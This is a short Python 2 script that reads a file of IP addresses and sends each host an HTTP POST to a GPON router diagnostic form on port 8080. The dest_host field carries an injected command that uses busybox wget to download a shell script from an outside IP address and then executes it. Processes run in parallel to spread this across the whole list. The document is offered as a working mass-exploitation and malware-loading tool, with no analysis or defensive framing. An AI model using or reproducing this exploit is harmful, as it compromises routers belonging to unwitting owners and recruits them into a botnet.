#! python !#
import threading, sys, time, random, socket, re, os, struct, array, requests
from Queue import *
from multiprocessing import Process

ips = open(sys.argv[1], "r").readlines()
queue_count = 0
queue = Queue()


def run(host):
        try:
            payload = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://213.183.53.120/catlol.sh+-O+/dev/talk;sh+/dev/talk`&ipv=0"
            url = "http://"+host+":8080/GponForm/diag_Form?images/"
            requests.post(url, data=payload, timeout=3)
            print "Legacy Loading " + host
        except:
		pass

def main():
    global queue_count
    for line in ips:
        line = line.strip("\r")
        line = line.strip("\n")
        queue_count += 1
        sys.stdout.write("\r[%d] Added to queue" % (queue_count))
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")
    i = 0
    while i != queue_count:
        i += 1
        try:
            input = queue.get()
            thread = Process(target=run, args=(input,))
            thread.start()
        except KeyboardInterrupt:
            os.kill(os.getpid(),9)
    return

if __name__ == "__main__":
    main()

